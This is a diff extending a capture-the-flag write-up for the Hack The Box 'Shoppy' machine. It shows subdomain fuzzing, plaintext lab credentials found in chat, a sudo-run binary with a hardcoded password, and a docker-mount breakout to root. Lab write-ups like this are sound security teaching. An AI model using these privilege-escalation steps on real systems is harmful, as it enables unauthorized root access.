@@ -106,7 +106,7 @@ it returnd me a json file to download with the following credentials:
 
 cracked josh password(md5)(https://crackstation.net/): ```remembermethisway```
 
-## 4 - DNS Enumeration ???
+## 4 - DNS Enumeration
 
 command:
 
@@ -114,4 +114,127 @@ command:
 ./ffuf -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shoppy.htb"
 ```
 
-result: didn`t work =/
+result:
+
+```
+alpblog                [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 185ms]
+mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 185ms]
+ www                    [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 199ms]
+:: Progress: [2178752/2178752] :: Job [1/1] :: 233 req/sec :: Duration: [2:50:18] :: Errors: 1413 ::
+```
+ ```
+ alpblog.shoppy.htb
+mattermost.shoppy.htb
+```
+
+## 5 - LOGIN AT mattermost.shoppy.htb
+
+Logged in using the josh credentials in the conversation between 
+user in the chat page I found another credentials
+
+```
+username: jaeger
+password: Sh0ppyBest@pp!
+```
+
+## 5 - CONNECT VIA SSH USING jaeger CREDENTIALS
+
+Used jaeger credentials to connect via ssh and get the user flag:
+
+```
+jaeger@shoppy:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  Templates  Videos  shoppy_start.sh  user.txt
+```
+
+## 6 - FIND password-maneger in deploy FILES
+
+Josh and Jess talked about a password-manager that if we look for permissions using:
+
+```
+sudo -l 
+```
+We will see we can run it as deploy user:
+
+```
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+```
+This way we will run the following command as deploy user
+
+```
+sudo -u deploy /home/deploy/password-manager
+```
+And this open the password-manager that ask for a password:
+```
+Welcome to Josh password manager!
+Please enter your master password:
+```
+We don`t have this password, lets see inside source code:
+```
+cat password-manager
+```
+
+We can see this strings:
+```
+Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
+```
+Lets use `Sample` as our password.
+
+Again: 
+
+```
+sudo -u deploy /home/deploy/password-manager
+```
+```
+Welcome to Josh password manager!
+Please enter your master password: Sample
+```
+And the result is:
+
+```
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+```
+Lets use the new user:
+
+```
+ssh deploy@10.10.11.180
+```
+
+7 - DOCKER EXPLOIT
+
+Lets look into the images running in the machine:
+
+command:
+```
+docker images
+```
+result:
+```
+REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
+alpine       latest    d7d3d98c851f   2 months ago   5.53MB
+```
+
+An alpine image running, lets try use this exploits https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
+
+command: 
+```
+docker run -it -v /:/host/ alpine chroot /host/ bash
+```
+result:
+```
+$ docker run -it -v /:/host/ alpine chroot /host/ bash
+root@135c6d7929a3:/#
+```
+
+Ok now we are root!
+
+command:
+```
+cd root
+cat root.txt
+```
+And we have root key.
+
